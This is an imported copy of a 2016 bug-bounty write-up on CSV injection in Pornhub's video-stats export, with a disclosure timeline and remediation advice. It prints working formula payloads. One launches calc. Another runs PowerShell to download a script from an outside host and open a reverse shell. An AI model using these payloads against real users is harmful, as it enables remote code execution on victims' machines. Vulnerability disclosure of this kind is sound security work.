---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-07-29_csv-injection-meterpreter-on-pornhub.md
original_filename: 2016-07-29_csv-injection-meterpreter-on-pornhub.md
title: CSV Injection -> Meterpreter on Pornhub
category: documents
detected_topics:
- command-injection
tags:
- imported
- documents
- command-injection
language: en
raw_sha256: 67331ea212408db8ecb48c618f2a589500478c3fe4e113078328e3ffcb26eee8
text_sha256: 25a74c97fe867cfdfa448b0220bdbb94ba3d0cc89a345302e37db743baf54d82
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# CSV Injection -> Meterpreter on Pornhub

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-07-29_csv-injection-meterpreter-on-pornhub.md
- Source Type: markdown
- Detected Topics: command-injection
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `67331ea212408db8ecb48c618f2a589500478c3fe4e113078328e3ffcb26eee8`
- Text SHA256: `25a74c97fe867cfdfa448b0220bdbb94ba3d0cc89a345302e37db743baf54d82`


## Content

---
title: "CSV Injection -> Meterpreter on Pornhub"
page_title: "CSV Injection on Pornhub"
url: "https://blog.zsec.uk/csvhub/"
final_url: "https://blog.zsec.uk/csvhub/"
authors: ["Andy Gill (@ZephrFish)"]
programs: ["PornHub"]
bugs: ["CSV injection"]
bounty: "500"
publication_date: "2016-07-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6273
---

[bugbounty](https://blog.zsec.uk/tag/bugbounty/)

# CSV Injection -> Meterpreter on Pornhub

[ ![Andy Gill](/content/images/size/w100/2017/10/ZSIcon.png) Andy Gill ](/author/andy/)

29 Jul 2016 · 2 min read

![CSV Injection -> Meterpreter on Pornhub](/content/images/size/w1000/2016/07/pornhub-hacked-bug-bounty-progrm.jpg)

Contents

This post will discuss an issue I found regarding CSV injection on Pornhub.com, allowing a remote attacker to inject malicious code into video titles resulting in potential full compromise of content creators and other users.

**Note: Pornhub have advised that they will no longer be rewarding for this type of bug. Additionally, this issue has now been fixed, Pornhub have closed the report and pushed out a code fix**

Difficulty: **Medium**  
Risk: **High**  
Affected URLs: pornhub.com  
Report Link: [https://hackerone.com/reports/146593](https://hackerone.com/reports/146593?ref=blog.zsec.uk)  
Date Reported: June 22nd, 2016  
Date Report Made Public: July 4th, 2016  
Bounty Paid: **$500**

This issue has been marked as high risk in this scenario based upon the affected user base and locations, however in a normal situation this would be regarded as Medium/Low.

###### Timeline of Events

  * Reported on Hackerone to Pornhub: 22nd June 2016
  * Issue Marked as Informative: 30th June 2016
  * Issue Publicly Disclosed: 4th July 2016
  * Issue Reopened: 20th July 2016
  * Pornhub Award $500 Bounty: 27th July 2016
  * Pornhub Push and Verify Fixed: 27th July 2016

**tl;dr this vulnerability is exploiting CSV injection, to gain meterpreter session on a victim's local system.**

I identified that the export video stats function was vulnerable to CSV injection that could be chained with a meterpreter payload resulting in client side remote code execution. The payload used to achieve the proof of concept is as follows:

`@SUM(1+2+3)*cmd|' /C calc'!A0`

This will launch calculator when the spreadsheet is downloaded and launched, it was identified that pornhub takes certain steps to attempt to escape this however it seems that the `@` character has been missed from the blacklisted characters and thus makes this attack possible.

To highlight the risk of this vulnerability, executing calc.exe isn’t enough sometimes, it doesn't look as impressive as a meterpreter shell. This is possible by using the following value:

`@SUM(1+2+3)*cmd|'/C powershell IEX(wget 0r.pe/p)'!A0`

This payload works by, when the CSV file is opened powershell is launched in the background which attempts to grab the Powersploit payload of Invoke-Shellcode to attempt a reverse shell connection back to the attacker's server.

#### Remediation

The recommended steps to remediate this issue in particular would be to ensure that video names contain only alpha-numeric characters and cannot be modified to add arbitrary characters.

For more information on this type of vulnerability please see the other post I did about [CSV Injection](https://blog.zsec.uk/csv-dangers-mitigations/).

* * *

Share [ ](https://twitter.com/intent/tweet?text=CSV%20Injection%20-%3E%20Meterpreter%20on%20Pornhub&url=https://blog.zsec.uk/csvhub/) [ ](https://www.linkedin.com/sharing/share-offsite/?url=https://blog.zsec.uk/csvhub/)

[bugbounty](/tag/bugbounty/) [bug](/tag/bug/) [pornhub](/tag/pornhub/) [csv injection](/tag/csv-injection/) [injection](/tag/injection/) [cell injection](/tag/cell-injection/) [RCE](/tag/rce/) [meterpreter](/tag/meterpreter/)
